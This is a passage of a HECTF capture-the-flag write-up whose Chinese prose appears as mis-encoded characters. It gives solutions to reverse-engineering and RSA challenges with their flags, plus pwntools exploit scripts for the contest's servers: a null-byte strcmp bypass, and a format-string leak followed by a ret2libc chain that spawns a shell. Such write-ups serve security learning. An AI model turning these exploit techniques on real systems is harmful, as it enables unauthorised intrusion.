class="number">4</span>, <span class="string">&#x27;big&#x27;</span>)):</span><br><span class="line">            result.append(BOX[item])</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(result, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_rot_left</span>(<span class="params">n, m</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;å¾ªç¯å·¦ç§»&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> ((n &lt;&lt; m) | (n &gt;&gt; (<span class="number">32</span> - m))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;AD763B4FCDCFD9251089FB0408A45F80&quot;</span>)  <span class="comment"># 128bitå¯†é’¥</span></span><br><span class="line">sm4 = SM4Cipher(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ¨è°ƒæµ‹è¯•åŠ å¯†</span></span><br><span class="line"><span class="comment"># plaintext = bytes.fromhex(&quot;0123456789abcdeffedcba9876543210&quot;)  # 128bitæ˜æ–‡</span></span><br><span class="line"><span class="comment"># print(sm4.encrypt(plaintext).hex())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è§£å¯†</span></span><br><span class="line">c = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;D75CDA22176DD392A1A570915F66A61C&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(sm4.decrypt(c).<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6f2069d8ab245446d789590d2cfe20d6</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="authorâ€™sB0x"><a href="#authorâ€™sB0x" class="headerlink" title="authorâ€™sB0x"></a>authorâ€™sB0x</h3><blockquote><p>still ez</p></blockquote><p>è¯†åˆ«ä»£ç é€»è¾‘ä¸ºRC4ç®—æ³•ï¼Œkeyä¸º <code>thiskey</code>ï¼Œæå–å¯†æ–‡hexä¸º <code>C3F5E5E2EC17E52ACA03B6FDC1BC704410CDA6130B9A73060E4DDE95129CD946</code>ï¼Œ</p><p>Cyberchefè§£å‡ºflagï¼š<code>HECTF&#123;Th3CutW0rmF0rgiv3sTh3Pl0w&#125;</code></p><p>â€‹    </p><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><p>åˆ†æä»£ç é€»è¾‘ï¼Œä¸º8å±‚8*8è¿·å®«ï¼Œå…¶ä¸­0ä¸ºå¯èµ°æ–¹å—ï¼Œ1ä¸ºä¸å¯èµ°æ–¹å—ï¼Œwsadä¸ºä¸Šä¸‹å·¦å³ï¼Œuä¸ºä¸‹ä¸€å±‚ï¼Œnä¸ºä¸Šä¸€å±‚ã€‚</p><p>å°†8å±‚01è¿·å®«çŸ©é˜µæ‰“å°å‡ºæ¥ï¼Œä»ç¬¬ä¸€å±‚ (0,0) æ‰‹åŠ¨æ¨¡æ‹Ÿèµ°è¿·å®«ï¼Œå¾—åˆ°è·¯å¾„ <code>ssddssuuwwddndduuussdussasauudd</code>ï¼ŒåŠ ä¸ŠHECTF{}å³ä¸ºflagã€‚</p><p>â€‹    </p><h3 id="è¿˜åŸmd5"><a href="#è¿˜åŸmd5" class="headerlink" title="è¿˜åŸmd5"></a>è¿˜åŸmd5</h3><blockquote><p>MD5(flag) = 55a573c5ff5ae053ee7f165c6e972613  å“ˆå“ˆå“ˆï¼Œé€†å»å§</p><p>HINTS:</p><p>æ³¨æ„ï¼Œreé¢˜ç›®md5çš„flagæäº¤æ—¶ä¸éœ€è¦å†å¥—HECTF{}</p></blockquote><p>txtå†…å®¹åƒæ˜¯è°ƒç”¨libsfdata.soè®¡ç®—md5è¿‡ç¨‹æ±‡ç¼–æ“ä½œè®°å½•ï¼Œæ—¢ç„¶æ˜¯å…¨è¿‡ç¨‹ï¼Œè‚¯å®šæœ‰è¯»å…¥åŸå§‹æ•°æ®ï¼Œä»¥16è¿›åˆ¶å­˜å…¥å¯„å­˜å™¨æˆ–å†…å­˜çš„ç—•è¿¹ï¼ŒHECTçš„hexå€¼â€48454354â€œï¼Œæ³¨æ„æ˜¯å°ç«¯åºï¼Œå…¨å±€æœç´¢ <code>54434548</code>ï¼Œæ‰¾åˆ° <code>r6=0x54434548</code> ç–‘ä¼¼è¯»å…¥å¯„å­˜å™¨æ“ä½œï¼Œç»§ç»­å…¨å±€æœç´¢ <code>=&gt; r6=0x</code>ï¼Œæœ‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Line 44619: [23:49:43 081][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x0 =&gt; r6=0x54434548</span><br><span class="line">Line 44624: [23:49:43 081][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x4 =&gt; r6=0x444d5f46</span><br><span class="line">Line 44629: [23:49:43 082][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x8 =&gt; r6=0x31332b32</span><br><span class="line">Line 44634: [23:49:43 083][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0xc =&gt; r6=0x39363636</span><br><span class="line">Line 44639: [23:49:43 083][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x10 =&gt; r6=0x37313237</span><br><span class="line">Line 44644: [23:49:43 084][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x14 =&gt; r6=0x34393338</span><br><span class="line">Line 44649: [23:49:43 085][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x18 =&gt; r6=0x43753059</span><br><span class="line">Line 44654: [23:49:43 085][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x1c =&gt; r6=0x6f646e61</span><br><span class="line">Line 44659: [23:49:43 086][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x20 =&gt; r6=0x743f7431</span><br><span class="line">Line 44664: [23:49:43 087][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x24 =&gt; r6=0x4b233964</span><br><span class="line">Line 44669: [23:49:43 087][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x28 =&gt; r6=0x37705f6e</span><br><span class="line">Line 44674: [23:49:43 088][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x2c =&gt; r6=0x80775576</span><br></pre></td></tr></table></figure><p>æå–å‡ºr6çš„å€¼hexè½¬å­—ç¬¦å³ä¸ºflagï¼š<code>HECTF_MD2+31666972178394Y0uCando1t?td9#Kn_p7vUw</code></p><p>â€‹    </p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>å…ˆåˆ©ç”¨ <code>\x00</code> æˆªæ–­ç»•è¿‡ <code>strcmp</code> æ¯”è¾ƒï¼Œè¿›å…¥ <code>system(&#39;vim -R&#39;)</code> çš„vimäº¤äº’æ¨¡å¼ï¼Œå†ä½¿ç”¨vimå‘½ä»¤ <code>:e æ–‡ä»¶å</code> è¯»å–flagå†…å®¹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;121.4.111.50&#x27;</span>,<span class="number">32365</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">b&#x27;x&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;:e flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç”±äºè¿›å…¥vimå‘½ä»¤ä¼šæ¸…ç©ºç»ˆç«¯å†…å®¹ï¼Œåœ¨pwntoolsäº¤äº’ä¸‹è¯»å–çš„å†…å®¹ä¼šè¢«ç¬é—´åˆ·æ‰ï¼Œå¯ä»¥å°†è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶ï¼Œè·å–åˆ°flagå†…å®¹è¾“å‡ºï¼š</p><p><code>python test.py &gt; output.txt</code></p><p>â€‹    </p><h3 id="çœŸÂ·ç­¾åˆ°"><a href="#çœŸÂ·ç­¾åˆ°" class="headerlink" title="çœŸÂ·ç­¾åˆ°"></a>çœŸÂ·ç­¾åˆ°</h3><blockquote><p>å¬è¯´ä½ è¿˜æ²¡ç­¾ä¸Šåˆ°</p></blockquote><p>intç±»å‹å¼ºåˆ¶è½¬æ¢ä¸ºcharï¼Œå½“å€¼ä¸º128~255æ—¶å˜æˆè´Ÿæ•°ï¼Œæ¨¡æ‹Ÿä¼ªä»£ç ï¼Œåœ¨æœ€å¤§å€¼2147483647é™„è¿‘å°è¯•å¯»æ‰¾æ‰€éœ€æ•°å­—ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> x = <span class="number">2147483646</span><span class="number">-124</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, x);</span><br><span class="line"><span class="keyword">int</span> y = x;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="keyword">char</span>)y);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="keyword">char</span>)y&lt;<span class="number">-125</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, y&gt;<span class="number">255</span>);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2147483522æ»¡è¶³æ¡ä»¶ï¼Œä¼ å…¥ågetshellæ‹¿åˆ°flagã€‚</p><p>â€‹    </p><h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><p>ç¨‹åºå¼€äº†PIEï¼ŒgdbåŠ¨è°ƒï¼Œåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²å½“å‰å‡½æ•°åœ°å€ï¼Œå†å‡å»åç§»å¾—åˆ°ç¨‹åºåŸºå€ï¼Œå‰©ä¸‹çš„éƒ¨åˆ†ç®€å•ret2libcå³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;121.4.102.43&#x27;</span>,<span class="number">31550</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/root/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r,&#x27;b *$rebase(0x123a)&#x27;)</span></span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">b&#x27;%15$p&#x27;</span>)</span><br><span class="line">pie_base = <span class="built_in">eval</span>(r.recv(<span class="number">14</span>))-<span class="number">0x123a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pie_base))</span><br><span class="line"></span><br><span class="line">pop_rdi = pie_base+<span class="number">0x1333</span></span><br><span class="line">pop_rsi_r15 = pie_base+<span class="number">0x1331</span></span><br><span class="line">ret = pie_base+<span class="number">0x101a</span></span><br><span class="line">puts_got = pie_base+elf.got.puts</span><br><span class="line">puts_plt = pie_base+elf.plt.puts</span><br><span class="line">get = pie_base+<span class="number">0x12ab</span></span><br><span class="line"></span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(get)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr-libc.sym.puts</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base+libc.sym.system</span><br><span class="line">binsh = libc_base+libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(binsh)+p64(pop_rsi_r15)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(system)+p64(get)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pl))</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="æµåŠ¨çš„éŸ³ç¬¦"><a href="#æµåŠ¨çš„éŸ³ç¬¦" class="headerlink" title="æµåŠ¨çš„éŸ³ç¬¦"></a>æµåŠ¨çš„éŸ³ç¬¦</h3><p>txtå†…ä¸ºéŸ³ç¬¦åŠ å¯†ï¼Œä½¿ç”¨<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">åœ¨çº¿è§£å¯†å·¥å…·</a>è§£å¯†å¾—åˆ°flagã€‚</p><p>â€‹    </p><h3 id="matrix"><a href="#matrix" class="headerlink" title="matrix"></a>matrix</h3><p>å‡ºé¢˜å¤±è¯¯ï¼Œæºç æ³„éœ²æ‹¿åˆ°flagã€‚</p><p>â€‹    </p><h3 id="ezrsa"><a href="#ezrsa" class="headerlink" title="ezrsa"></a>ezrsa</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">flag = <span class="string">b&#x27;xxx&#x27;</span></span><br><span class="line">e = <span class="number">114</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">t = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q * t</span><br><span class="line">p_=<span class="built_in">pow</span>(p,<span class="number">2</span>,n)</span><br><span class="line">q_=<span class="built_in">pow</span>(q,<span class="number">2</span>,n)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p_=&#x27;</span>,p_)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q_=&#x27;</span>,q_)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n=&#x27;</span>,n)</span><br><span class="line"><span class="comment">#p_= 10660749010264526666955869622200514149424664070021154725214604278423033834800955315638637946982741577976025615843487738805576629855459529381681679497064453109727962183277768658053394103348827822686515016677449953958986089293779870089604784750116267441026319440135025236091029928565442799040007751858012409498271852333017388486644053877238274838173771344350870565886676055860728949042361028753924290647753862707042472944714140635484722345522648010064713004854479094986010632316750770118044301903260988074471243247031854872785324506292730778884664223412372663828159205320038546293395502275887356885181013870536857351801</span></span><br><span class="line"><span class="comment">#q_= 24900409366873586425973971191854411152048453357438215578406168704445779543895031579176888535442469919297663892450230816720758414920791049333275007446412352293152157437672026001378469357187698312455020558413101033543700131403373834030395855212901673914686297701313223697181049265286011127188695284002470629178098454764536315245968458622929902214839704674718996340182311301099900271312644919770585429288043854743210617868761990329037081770477261306489047429460937057125193231432195877922731165870197358946683698077175950756482605399815830687563398277515452842563143685190688865084064679712177247354049377034394880941369</span></span><br><span class="line"><span class="comment">#c= 946358882688806235743551077996671406469185038565566907261383734984318844703303437873183869084536703835433988817350857866089668970925835657856975155167500190428922521871327955274363186305180350899397478897928581580727458938934640786146518171503388507311655160765881370401217708135845031083189007308497775864484758699096082815479602777639307812516934937183952478316508418895341680335172973583094238147073379957772209947376051520041093030641369536800448737539973770258342422560893630082723217759837690008955748444973711508371077927468399703456466637348191192859278206925769696645636969358967735037470196395844215361527039288120664704552775460536654859848091685928057224735031528303041212702445718384890182474053295656578327780048497422707815820736647212902522526653039676698263673166412650104420869762547385554961873764933774143297622712766521201037469301912471740996998228799841957283759679784569638149555093498363791420486340</span></span><br><span class="line"><span class="comment">#n= 1677924010415009671349677258549532467848510897335579570922114838282842960143799964694977371357046837674443739542407516581076865550606801686170400793463690366665534118961173768008603133641864003317727610676872685077700753537755254540591236871020140458419596610210236431401477173114522177145982007059709616618279936170223104755776796458682957656555154039384483954754660803554302451221585280396378564648495919069459351016010016636012245082009946238467068412198769348889950331295680906811430325690102055808865038151762131291269197341984605959088829226733422023970618165958725486675321766767430347929319621215891165857544847088373700410007500868721335483070938971597851859953792409442485301373327127595552457801719192824050415833073999094005750868115932130442747899994421453654008731830580286370350900523295205445599466666709544075950517531382971246869745425091317996973135364990272852701046046315136273893166361180330563013617843 </span></span><br></pre></td></tr></table></figure></blockquote><p>å›  $p^2&lt;n,q^2&lt;n$ï¼Œå¯ç›´æ¥å¼€æ”¾æ±‚å¾— $p,q$ åŠ $r$ã€‚</p><p>åˆ $\gcd(e,\varphi)=6$ï¼Œåˆ©ç”¨ $\gcd(\cfrac{e}{6},\varphi)=1$ å…ˆå¸¸è§„RSAè®¡ç®—å‡º $m^6$ å†å¼€æ–¹å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">p_ = </span><br><span class="line">q_ = </span><br><span class="line">c = </span><br><span class="line">n = </span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = gmpy2.iroot(p_,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">q = gmpy2.iroot(q_,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">r = n//(p*q)</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">114</span></span><br><span class="line">d = inverse_mod(e//<span class="number">6</span>,f)</span><br><span class="line">mm = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">m = gmpy2.iroot(mm,<span class="number">6</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;HECTF&#123;Congratulation!!you_find_flag&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="rsa2"><a href="#rsa2" class="headerlink" title="rsa2"></a>rsa2</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, hint, e1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mygenerate</span>():</span></span><br><span class="line"> <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">     p = getPrime(<span class="number">512</span>)</span><br><span class="line">     <span class="keyword">if</span> p % <span class="number">8</span> == <span class="number">5</span>:</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"> g = p-random.randint(<span class="number">1</span> &lt;&lt; <span class="number">13</span>, <span class="number">1</span> &lt;&lt; <span class="number">15</span>)</span><br><span class="line"> q = sympy.nextprime(math.gamma(g+<span class="number">1</span>) % p)</span><br><span class="line"> <span class="keyword">return</span> p, g, q</span><br><span class="line"></span><br><span class="line">p, g, q = mygenerate()</span><br><span class="line">n = p*q</span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">m1 = bytes_to_long(flag)</span><br><span class="line">m2 = bytes_to_long(hint)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e1, p)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e2, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p =&#x27;</span>+<span class="built_in">str</span>(p))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;g =&#x27;</span>+<span class="built_in">str</span>(g))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c1 =&#x27;</span>+<span class="built_in">str</span>(c1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c2 =&#x27;</span>+<span class="built_in">str</span>(c2))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p =8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672846909</span></span><br><span class="line"><span class="string">g =8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672815766</span></span><br><span class="line"><span class="string">c1 =6235217214618484469008717065109058585860810027126999050539741461978786126300064219884646722757808536523766850480291000964963856026236813451563022630637528</span></span><br><span class="line"><span class="string">c2 =11968687437667021636457941077557698735979559596315355015261643918655719362366246657937192921814834456270616376603153881488026042955084056042773344426448580968726245676672896245296438903588066436834165402064132845092674100931069500643230951702318353312541552786636249326131049369846465301549915712690800690627</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>ç´ å› å­çš„ç”Ÿæˆå‡½æ•°ä¸­ï¼Œ</p><p>$q=\text{nextprime}(\Gamma(g+1) \bmod p)=\text{nextprime}(g! \bmod p)=\text{nextprime}((p-r)! \bmod p)$</p><p>ç»“åˆå¨å°”é€Šå®šç† $(p-2)! \equiv 1 \pmod p$ï¼Œæœ‰</p><p>$q = \text{nextprime}(\prod\limits_{k=2}^{r-1}(p-k)^{-1} \bmod p)$</p><p>æ±‚å‡º $p,q$ ï¼ŒRSAè§£å¯†å¾—hintï¼š$e_1=2$ï¼Œå†è§£å¯†å¾— $m$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line">p =<span class="number">8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672846909</span></span><br><span class="line">g =<span class="number">8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672815766</span></span><br><span class="line">c1 =<span class="number">6235217214618484469008717065109058585860810027126999050539741461978786126300064219884646722757808536523766850480291000964963856026236813451563022630637528</span></span><br><span class="line">c2 =<span class="number">11968687437667021636457941077557698735979559596315355015261643918655719362366246657937192921814834456270616376603153881488026042955084056042773344426448580968726245676672896245296438903588066436834165402064132845092674100931069500643230951702318353312541552786636249326131049369846465301549915712690800690627</span></span><br><span class="line">r = p-g</span><br><span class="line">q = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,r):</span><br><span class="line">    q = q*inverse_mod(p-k,p)%p</span><br><span class="line">q = sympy.nextprime(q)</span><br><span class="line">n = p*q</span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d2 = inverse_mod(e2,f)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2,d2,n)</span><br><span class="line">hint = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m2)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(hint)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Here, e1=2, think 